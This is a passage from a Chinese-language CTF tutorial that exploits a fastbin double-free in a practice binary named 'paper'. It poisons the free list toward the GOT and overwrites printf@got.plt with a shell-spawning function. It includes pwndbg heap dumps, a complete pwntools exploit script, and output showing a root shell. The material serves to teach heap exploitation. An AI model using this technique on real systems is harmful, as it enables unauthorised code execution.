0x7f5596e20b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7f5596e20b70 <main_arena+80>:	0x0000000000000000	0x0000000000c7a090 #top_chunk
0x7f5596e20b80 <main_arena+96>:	0x0000000000000000	0x00007f5596e20b78
0x7f5596e20b90 <main_arena+112>:	0x00007f5596e20b78	0x00007f5596e20b88
pwndbg> 
```

看一下程序内存中的指针：

```powershell
pwndbg> x/16gx 0x6020c0
0x6020c0 <link_list>:	0x0000000000000000	0x0000000000c7a020
                      #index=0            #index=1
0x6020d0 <link_list+16>:	0x0000000000c7a060	0x0000000000000000
                          #index=2           #index=3
0x6020e0 <link_list+32>:	0x0000000000000000	0x0000000000000000
0x6020f0 <link_list+48>:	0x0000000000000000	0x0000000000000000
0x602100 <link_list+64>:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

> 再次说明，exp创建堆块的index是index1与index2。
>

## 释放创建的chunk
接下来我们使用fastbin的特性来利用fastbin_double_free，依次释放chunk1、chunk2、chunk1。

> 由于不小心关了gdb调试，使得下面的堆地址与之前的不相同，谅解一下啦~
>

```powershell
pwndbg> x/1000gx 0x23c4000
0x23c4000:	0x0000000000000000	0x0000000000001011 #buffer_zone
0x23c4010:	0x00000000000a0a31	0x0000000000000000
.....(省略内容均为空)
0x23c5010:	0x0000000000000000	0x0000000000000041 #chunk1
0x23c5020:	0x00000000023c5050	0x0000000000000000
0x23c5030:	0x0000000000000000	0x0000000000000000
0x23c5040:	0x0000000000000000	0x0000000000000000
0x23c5050:	0x0000000000000000	0x0000000000000041 #chunk2
0x23c5060:	0x00000000023c5010	0x0000000000000000
0x23c5070:	0x0000000000000000	0x0000000000000000
0x23c5080:	0x0000000000000000	0x0000000000000000
0x23c5090:	0x0000000000000000	0x0000000000020f71 #top_chunk
.....(省略内容均为空)
0x23c5f30:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &main_arena
0x7fbec9212b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b30 <main_arena+16>:	0x0000000000000000	0x00000000023c5010 #chunk1
0x7fbec9212b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b70 <main_arena+80>:	0x0000000000000000	0x00000000023c5090 #top_chunk
0x7fbec9212b80 <main_arena+96>:	0x0000000000000000	0x00007fbec9212b78
0x7fbec9212b90 <main_arena+112>:	0x00007fbec9212b78	0x00007fbec9212b88
pwndbg> 
```

此时的fastbin链表应该是这样子的：

main_arena->chunk1->chunk2->chunk1

利用之前的文章图：

[PWN入门（3-7-2）-fastbin_attack中的fastbin_double_free（基础）](https://www.yuque.com/cyberangel/rg9gdm/rb3wx3)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601945211476-e5e0cac9-2d57-48f8-91b0-428b945add91.png)

这样就创建了一个fastbin单向循环链表。

请注意，这两个chunk均被free，但是由于UAF漏洞的存在，指向chunk_data的指针仍然存在。

```powershell
pwndbg> x/16gx 0x6020c0
0x6020c0 <link_list>:	0x0000000000000000	0x00000000023c5020
0x6020d0 <link_list+16>:	0x00000000023c5060	0x0000000000000000
0x6020e0 <link_list+32>:	0x0000000000000000	0x0000000000000000
0x6020f0 <link_list+48>:	0x0000000000000000	0x0000000000000000
0x602100 <link_list+64>:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120:	0x0000000000000000	0x0000000000000000
0x602130:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

## 再次创建一个chunk
再次创建一个chunk，它的大小与之前的相同，为0x30。内容为0x60202a。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1602477413974-49fedb8f-85d6-4bc7-a764-4881c64e0300.png)

在IDA中并没有发现地址0x60202a的内容，它到底是什么呢？这个先放一放之后再说。

payload：

```python
add_paper(0x30, 1, p64(0x60202a)) #chunk1
```

这行代码执行完之后内存状况如下：

```powershell
pwndbg> x/1000gx 0x23c4000
0x23c4000:	0x0000000000000000	0x0000000000001011
0x23c4010:	0x000000000060202a	0x000000000000000a
......(省略内容均为空)
0x23c5010:	0x0000000000000000	0x0000000000000041 #chunk1(used)
0x23c5020:	0x000000000060202a	0x0000000000000000
0x23c5030:	0x0000000000000000	0x0000000000000000
0x23c5040:	0x0000000000000000	0x0000000000000000
0x23c5050:	0x0000000000000000	0x0000000000000041 #chunk2(free)
0x23c5060:	0x00000000023c5010	0x0000000000000000
0x23c5070:	0x0000000000000000	0x0000000000000000
0x23c5080:	0x0000000000000000	0x0000000000000000
0x23c5090:	0x0000000000000000	0x0000000000020f71 #top_chunk
......(省略内容均为空)
0x23c5f30:	0x0000000000000000	0x0000000000000000
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x23c5050 ◂— 0x0 #chunk2(free)
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> x/16gx &main_arena
0x7fbec9212b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b30 <main_arena+16>:	0x0000000000000000	0x00000000023c5050 #chunk2(free)
0x7fbec9212b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7fbec9212b70 <main_arena+80>:	0x0000000000000000	0x00000000023c5090 #top_chunk
0x7fbec9212b80 <main_arena+96>:	0x0000000000000000	0x00007fbec9212b78
0x7fbec9212b90 <main_arena+112>:	0x00007fbec9212b78	0x00007fbec9212b88
pwndbg> 
```

从内存区域可以看到chunk1的fd指针地址已经改为了0x60202a，这个地址是属于程序的_got_plt区域。

稍微的总结一下：

在malloc之前：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1601945211476-e5e0cac9-2d57-48f8-91b0-428b945add91.png)

在malloc之后：

main_arena->chunk2->chunk1->0x60202a

可以看到，在申请之后，指向新堆块的指针还是第一次malloc的地址。

> 这道题虽然存在着UAF漏洞，但是其实没有什么实际作用。
>

## 再次申请三个堆块
申请两个堆块之后，fastbin应该变成：main_arena->0x60202a，这时再次申请第三个堆块，这时程序就可以控制了0x60202a地址。

## 修改.got.plt地址
<font style="color:#555555;">首先来看一下修改之前的</font>0x602000内存区域：

```python
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000601e28	0x00007f0b09a29168
0x602010:	0x00007f0b09819f10	0x00007f0b094bc540
0x602020 <puts@got.plt>:	0x00007f0b094a76a0	0x00007f0b094a61b0
0x602030 <__stack_chk_fail@got.plt>:	0x0000000000400746	0x0000000000400756
0x602040 <printf@got.plt>:	0x00007f0b0948d810	0x00007f0b09458750
0x602050 <__gmon_start__@got.plt>:	0x0000000000400786	0x00007f0b094733d0
0x602060 <malloc@got.plt>:	0x00007f0b094bc180	0x00007f0b094a7e80
0x602070 <__isoc99_scanf@got.plt>:	0x00007f0b094a34e0	0x00000000004007d6
pwndbg> 

```

<font style="color:#555555;">payload：</font>

```python
add_paper(0x30, 1, "\x40\x00\x00\x00\x00\x00"+p64(myelf.symbols["gg"])) #0x60202a_chunk
```

<font style="color:#555555;">执行完payload后：</font>

```python
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000601e28	0x00007f0b09a29168
0x602010:	0x00007f0b09819f10	0x00007f0b094bc540
0x602020 <puts@got.plt>:	0x00007f0b094a76a0	0x00007f0b094a61b0
                                                #prev_size
0x602030 <__stack_chk_fail@got.plt>:	0x0000000000400746	0x0000000000400756
    									#size               #malloc_data_start
        						  #__stack_chk_fail@got.plt #system@got.plt
0x602040 <printf@got.plt>:	0x0000000000400943	0x00007f0b09458700
    						#gg函数		      #这个地址内容改动不重要（__libc_start_main）
#0x602040 <printf@got.plt>:	0x00007f0b0948d810	0x00007f0b09458750（payload执行之前）
    						#printf@got.plt               
0x602050 <__gmon_start__@got.plt>:	0x0000000000400786	0x00007f0b094733d0
0x602060 <malloc@got.plt>:	0x00007f0b094bc180	0x00007f0b094a7e80
0x602070 <__isoc99_scanf@got.plt>:	0x00007f0b094a34e0	0x00000000004007d6
pwndbg> 
```

<font style="color:#555555;">在payload中我们采用了0x60202a为fd，由堆的结构我们可以控制0x60203a处。</font>

<font style="color:#555555;">payload中的“</font>\x40\x00\x00\x00\x00\x00<font style="color:#555555;">”是为了防止system地址被破坏，</font>printf@got.plt被<font style="color:#555555;">覆盖为gg()地址。</font>

然后在程序中随便输入个字符让程序打印出“"%s input is not start with number!\n"”就可以触发printf即可getshell。

> 由于程序没有index的验证重复功能，因此可以多次利用某一个index，但这都不重要啦，能getshell就好啦~
>

# exp及详情
```python
from pwn import *
context(os='linux',arch='amd64',log_level='debug')

myelf = ELF("./paper")
io = process(myelf.path)

def add_paper(num, index, content):
    io.recv()
    io.sendline("1")
    io.recv()
    io.sendline(str(index))
    io.recv()
    io.sendline(str(num))
    io.recv()
    io.sendline(content)

def del_paper(index):
    io.recv()
    io.sendline("2")
    io.recv()
    io.sendline(str(index))

add_paper(0x30, 1, "1")
add_paper(0x30, 2, "1")

#gdb.attach(io)

del_paper(1)
del_paper(2)
del_paper(1)

#gdb.attach(io)

add_paper(0x30, 1, p64(0x60202a)) #chunk1
#gdb.attach(io)
add_paper(0x30, 1, "1")
#gdb.attach(io)
add_paper(0x30, 1, "1")
#gdb.attach(io)
add_paper(0x30, 1, "\x40\x00\x00\x00\x00\x00"+p64(myelf.symbols["gg"])) #0x60202a_chunk
#add_paper(0x30, 1, "\x40\x00\x00\x00\x00\x00"+p64(myelf.symbols["gg"]))
#gdb.attach(io)

io.recv()
io.sendline("a")
#gdb.attach(io)
io.interactive()
```

```python
➜  fastbin_double_free sudo python paper_exp.py
[sudo] password for ubuntu: 
[DEBUG] PLT 0x400710 free
[DEBUG] PLT 0x400720 puts
[DEBUG] PLT 0x400730 fread
[DEBUG] PLT 0x400740 __stack_chk_fail
[DEBUG] PLT 0x400750 system
[DEBUG] PLT 0x400760 printf
[DEBUG] PLT 0x400770 __libc_start_main
[DEBUG] PLT 0x400780 __gmon_start__
[DEBUG] PLT 0x400790 strtol
[DEBUG] PLT 0x4007a0 malloc
[DEBUG] PLT 0x4007b0 setvbuf
[DEBUG] PLT 0x4007c0 __isoc99_scanf
[DEBUG] PLT 0x4007d0 exit
[*] '/home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper' argv=['/home/ubuntu/Desktop/fastbin_attack/fastbin_double_free/paper'] : pid 4217
[DEBUG] Received 0x47 bytes:
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x27 bytes:
    'Input the index you want to store(0-9):'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x18 bytes:
    'How long you will enter:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1a bytes:
    'please enter your content:'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x54 bytes:
    'add success!\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x27 bytes:
    'Input the index you want to store(0-9):'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x18 bytes:
    'How long you will enter:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1a bytes:
    'please enter your content:'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x54 bytes:
    'add success!\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x3c bytes:
    "which paper you want to delete,please enter it's index(0-9):"
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x58 bytes:
    'delete success !\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x3c bytes:
    "which paper you want to delete,please enter it's index(0-9):"
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x58 bytes:
    'delete success !\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Received 0x3c bytes:
    "which paper you want to delete,please enter it's index(0-9):"
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x58 bytes:
    'delete success !\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x27 bytes:
    'Input the index you want to store(0-9):'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x18 bytes:
    'How long you will enter:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1a bytes:
    'please enter your content:'
[DEBUG] Sent 0x9 bytes:
    00000000  2a 20 60 00  00 00 00 00  0a                        │* `·│····│·│
    00000009
[DEBUG] Received 0x54 bytes:
    'add success!\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x27 bytes:
    'Input the index you want to store(0-9):'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x18 bytes:
    'How long you will enter:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1a bytes:
    'please enter your content:'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x54 bytes:
    'add success!\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x27 bytes:
    'Input the index you want to store(0-9):'
[DEBUG] Sent 0x2 bytes:
    '1\n'
    'How long you will enter:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1a bytes:
    'please enter your content:'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x54 bytes:
    'add success!\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x27 bytes:
    'Input the index you want to store(0-9):'
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x18 bytes:
    'How long you will enter:'
[DEBUG] Sent 0x3 bytes:
    '48\n'
[DEBUG] Received 0x1a bytes:
    'please enter your content:'
[DEBUG] Sent 0xf bytes:
    00000000  40 00 00 00  00 00 43 09  40 00 00 00  00 00 0a     │@···│··C·│@···│···│
    0000000f
[DEBUG] Received 0x54 bytes:
    'add success!\n'
    'Welcome to use the paper management system!\n'
    '1 add paper\n'
    '2 delete paper\n'
[DEBUG] Sent 0x2 bytes:
    'a\n'
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    'ls\n'
[DEBUG] Received 0x41 bytes:
    'paper  paper_exp.py  paper_source.c  secretgarden_data\ttest_data\n'
paper  paper_exp.py  paper_source.c  secretgarden_data    test_data
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x5 bytes:
    'root\n'
root
$  
```





